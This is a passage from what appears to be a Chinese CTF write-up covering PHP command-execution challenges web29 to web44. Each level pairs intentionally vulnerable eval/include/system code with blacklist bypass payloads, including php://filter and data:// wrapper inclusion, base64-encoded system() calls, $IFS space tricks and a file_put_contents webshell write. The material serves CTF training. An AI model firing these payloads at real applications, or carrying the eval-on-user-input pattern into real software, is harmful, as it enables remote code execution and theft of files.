flag.php&quot;);</code><br>include+伪协议：<br><code>?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br>写马：<br><code>file_put_contents(&quot;a.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;a&quot;]);%20?&gt;%27);</code> 直接访问post或者连webshell<br>主要是绕过flag，其实还有很多读到flag.php的方法，不过前提都是绕过flag<br>改flag.php文件名：<br>用cp，mv，rename<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"> &lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125; <br></code></pre></td></tr></table></figure>ban了system和php，不能套php一句话，但可以套eval用其他参数传值绕过正则<br><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac f*&quot;);</code><br>passthru绕过system：<br><code>passthru</code>：<code>?c=passthru(&#39;cat f*&#39;);</code><br>反引号代替system：<br><code>?c=echo </code>cat f*<code>;</code></li></ul><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    $c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, $c))&#123;<br>        <span class="hljs-built_in">eval</span>($c);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag、system、php、cat、sort、shell关键字还有<code>.</code>和空格<br>套eval通杀<code>?c=eval($_GET[1]);&amp;1=system(&#39;cat f*&#39;);</code><br>passthru：<code>?c=passthru(&quot;tac\$IFS\$6f*&quot;);</code> <code>$IFS$6</code>、<code>$&#123;IFS&#125;</code>、<code>%09</code>绕空格，$需要转义<br>反引号也行：<code>print_r(</code>nl%09f*<code>);</code><br>高级操作：<br>1.文件包含加伪协议：<br><code>?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code><br>2：<br><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));  </code><br> <code>localeconv</code>可以返回包括小数点在内的一个数组；<code>pos</code>去取出数组中当前第一个元素，也就是小数点。 <code>scandir</code>可以结合它扫描当前目录内容。 <code>?c=print_r(scandir(pos(localeconv()))); </code>可以看到当前目录下有<code>flag.php </code>通过<code>array_reverse</code>把数组逆序，通过<code>next</code>取到第二个数组元素，也即flag.php 然后<code>show_source</code>直接高亮<code>flag.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">Array</span><br><span class="hljs-comment">(</span><br><span class="hljs-comment">    [decimal_point] =&gt; .</span><br><span class="hljs-comment">    [thousands_sep] =&gt; </span><br><span class="hljs-comment">    [int_curr_symbol] =&gt; </span><br><span class="hljs-comment">    [currency_symbol] =&gt; </span><br><span class="hljs-comment">    [mon_decimal_point] =&gt; </span><br><span class="hljs-comment">    [mon_thousands_sep] =&gt; </span><br><span class="hljs-comment">    [positive_sign] =&gt; </span><br><span class="hljs-comment">    [negative_sign] =&gt; </span><br><span class="hljs-comment">    [int_frac_digits] =&gt; 127</span><br><span class="hljs-comment">    [frac_digits] =&gt; 127</span><br><span class="hljs-comment">    [p_cs_precedes] =&gt; 127</span><br><span class="hljs-comment">    [p_sep_by_space] =&gt; 127</span><br><span class="hljs-comment">    [n_cs_precedes] =&gt; 127</span><br><span class="hljs-comment">    [n_sep_by_space] =&gt; 127</span><br><span class="hljs-comment">    [p_sign_posn] =&gt; 127</span><br><span class="hljs-comment">    [n_sign_posn] =&gt; 127</span><br><span class="hljs-comment">    [grouping] =&gt; Array</span><br><span class="hljs-comment">        (</span><br><span class="hljs-comment">        )</span><br><span class="hljs-comment">    [mon_grouping] =&gt; Array</span><br><span class="hljs-comment">        (</span><br><span class="hljs-comment">        )</span><br><span class="hljs-comment">)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//.</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))); <span class="hljs-comment">//print_r(scandir(&#x27;.&#x27;));</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了单引号、反引号、 echo ，； 和（<br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?&gt;</code>闭合前面的语句，代替<code>;</code> include可以不用括号</p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了单引号，反引号，;和(<br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了<code>&lt;</code><br><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了数字<br><code>?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.php</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code><br><code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code></p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了flag，想到base64<br><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br><code>**?c=data://text/plain,&lt;?php system(&#39;tac f*&#39;);?&gt;**</code></p><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br>过滤php用短标签<br><code>?c=data://text/plain,&lt;?= system(&#39;tac f*&#39;);?&gt;</code></p><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</code><br><code>?c=data://text/plain,&lt;?= system(&#39;tac f*&#39;);?&gt;</code><br>语句已经闭合，.php无影响</p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>注意到过滤的是中文的括号<br><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));  </code><br><code>?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p><code>?c=show_source(next(array_reverse(scandir(getcwd())))); </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;pwd&#x27;</span>)==<span class="hljs-title function_ invoke__">getcwd</span>());<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bool(true)</span><br></code></pre></td></tr></table></figure><p><code>getcwd()</code>获取当前目录</p><p><code>?c=eval(next(reset(get_defined_vars())));&amp;cmd=;system(&quot;tac flag.php&quot;);</code><br> get_defined_vars() 返回一个包含所有已定义变量的多维数组  ，该数组包含get和post<br><code>reset</code>指针重置到数组中的第一个元素<br><code>next() </code>函数将内部指针指向数组中的下一个元素，并输出。</p><p><code>?c=eval(array_pop(next(get_defined_vars()))); </code>post<br> <code>array_pop()</code> 函数删除数组中的最后一个元素并返回其值。  </p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code> 这条命令的意思是将标准输出和错误输出全部重定向到/dev/null中,也就是将产生的所有信息丢弃<br><code>?c=tac flag.php;</code>用分号将命令截断<br><code>?c=cat flag.php%0A</code> 换行符</p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了分号和cat<br><code>?c=tac flag.php%0A</code><br><code>?c=nl flag.php%0A</code><br><code>?c=less flag.php||</code>  逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行</p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/;|cat|flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>?c=tac fl?g.php%0A</code><br><code>?c=tac f*.php%0A</code><br>通配符即可</p><h3 